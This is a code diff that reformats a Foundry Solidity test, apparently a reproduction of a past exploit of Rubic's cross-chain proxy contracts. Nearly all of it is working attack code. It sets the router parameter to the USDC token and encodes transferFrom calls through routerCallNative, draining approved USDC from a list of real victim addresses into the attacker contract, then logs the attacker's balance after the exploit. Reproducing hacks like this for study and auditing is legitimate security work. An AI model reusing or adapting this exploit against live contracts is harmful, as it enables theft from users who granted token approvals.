@@ -12,6 +12,7 @@ import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
 // https://etherscan.io/tx/0x9a97d85642f956ad7a6b852cf7bed6f9669e2c2815f3279855acf7f1328e7d46
 
 interface RubicProxy1 {
+
     struct BaseCrossChainParams {
         address srcInputToken;
         uint256 srcInputAmount;
@@ -23,13 +24,12 @@ interface RubicProxy1 {
         address router;
     }
 
-    function routerCallNative(
-        BaseCrossChainParams calldata _params,
-        bytes calldata _data
-    ) external;
+    function routerCallNative(BaseCrossChainParams calldata _params, bytes calldata _data) external;
+
 }
 
 interface RubicProxy2 {
+
     struct BaseCrossChainParams {
         address srcInputToken;
         uint256 srcInputAmount;
@@ -46,14 +46,14 @@ interface RubicProxy2 {
         BaseCrossChainParams calldata _params,
         bytes calldata _data
     ) external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    RubicProxy1 Rubic1 =
-        RubicProxy1(0x3335A88bb18fD3b6824b59Af62b50CE494143333);
-    RubicProxy2 Rubic2 =
-        RubicProxy2(0x33388CF69e032C6f60A420b37E44b1F5443d3333);
+    RubicProxy1 Rubic1 = RubicProxy1(0x3335A88bb18fD3b6824b59Af62b50CE494143333);
+    RubicProxy2 Rubic2 = RubicProxy2(0x33388CF69e032C6f60A420b37E44b1F5443d3333);
     address integrators = 0x677d6EC74fA352D4Ef9B1886F6155384aCD70D90;
 
     function setUp() public {
@@ -89,70 +89,53 @@ contract ContractTest is Test {
         victims[24] = 0x44a59A1d38718c5cA8cB6E8AA7956859D947344B;
         victims[25] = 0xD0245a08f5f5c54A24907249651bEE39F3fE7014;
 
-        RubicProxy1.BaseCrossChainParams memory _params1 = RubicProxy1
-            .BaseCrossChainParams({
-                srcInputToken: address(0),
-                srcInputAmount: 0,
-                dstChainID: 0,
-                dstOutputToken: address(0),
-                dstMinOutputAmount: 0,
-                recipient: address(0),
-                integrator: integrators,
-                router: address(USDC)
-            });
-        RubicProxy2.BaseCrossChainParams memory _params2 = RubicProxy2
-            .BaseCrossChainParams({
-                srcInputToken: address(0),
-                srcInputAmount: 0,
-                dstChainID: 0,
-                dstOutputToken: address(0),
-                dstMinOutputAmount: 0,
-                recipient: address(0),
-                integrator: integrators,
-                router: address(USDC)
-            });
+        RubicProxy1.BaseCrossChainParams memory _params1 = RubicProxy1.BaseCrossChainParams({
+            srcInputToken: address(0),
+            srcInputAmount: 0,
+            dstChainID: 0,
+            dstOutputToken: address(0),
+            dstMinOutputAmount: 0,
+            recipient: address(0),
+            integrator: integrators,
+            router: address(USDC)
+        });
+        RubicProxy2.BaseCrossChainParams memory _params2 = RubicProxy2.BaseCrossChainParams({
+            srcInputToken: address(0),
+            srcInputAmount: 0,
+            dstChainID: 0,
+            dstOutputToken: address(0),
+            dstMinOutputAmount: 0,
+            recipient: address(0),
+            integrator: integrators,
+            router: address(USDC)
+        });
         uint256 amount;
         for (uint256 i = 0; i < 8; i++) {
             uint256 victimsBalance = USDC.balanceOf(victims[i]);
-            uint256 victimsAllowance = USDC.allowance(
-                address(victims[i]),
-                address(Rubic1)
-            );
+            uint256 victimsAllowance = USDC.allowance(address(victims[i]), address(Rubic1));
             amount = victimsBalance;
             if (victimsBalance >= victimsAllowance) {
                 amount = victimsAllowance;
             }
-            bytes memory data = abi.encodeWithSignature(
-                "transferFrom(address,address,uint256)",
-                victims[i],
-                address(this),
-                amount
-            );
+            bytes memory data =
+                abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), amount);
             Rubic1.routerCallNative(_params1, data);
         }
         for (uint256 i = 8; i < victims.length; i++) {
             uint256 victimsBalance = USDC.balanceOf(victims[i]);
-            uint256 victimsAllowance = USDC.allowance(
-                address(victims[i]),
-                address(Rubic2)
-            );
+            uint256 victimsAllowance = USDC.allowance(address(victims[i]), address(Rubic2));
             amount = victimsBalance;
             if (victimsBalance >= victimsAllowance) {
                 amount = victimsAllowance;
             }
-            bytes memory data = abi.encodeWithSignature(
-                "transferFrom(address,address,uint256)",
-                victims[i],
-                address(this),
-                amount
-            );
+            bytes memory data =
+                abi.encodeWithSignature("transferFrom(address,address,uint256)", victims[i], address(this), amount);
             Rubic2.routerCallNative("", _params2, data);
         }
 
         emit log_named_decimal_uint(
-            "[End] Attacker USDC balance after exploit",
-            USDC.balanceOf(address(this)),
-            USDC.decimals()
+            "[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
         );
     }
+
 }
